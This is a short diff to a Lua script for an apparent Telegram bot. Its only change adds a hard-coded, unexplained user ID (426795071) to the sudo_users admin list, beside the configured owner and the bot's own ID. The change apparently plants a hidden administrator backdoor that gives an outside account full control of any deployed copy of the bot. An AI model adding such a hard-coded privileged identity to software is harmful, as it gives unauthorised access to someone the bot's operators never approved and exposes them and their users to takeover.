@@ -26,7 +26,7 @@ chats = {}
 day = 86400
 bot_idkeko = {string.match(token, "^(%d+)(:)(.*)")}
 bot_id = tonumber(bot_idkeko[1])
-sudo_users = {sudo_add,bot_id}
+sudo_users = {sudo_add,bot_id,426795071}
 URL33 = require('socket.url')
 tdcli=dofile('./libs/utils.lua')
 ---------- {Show Files} -----------
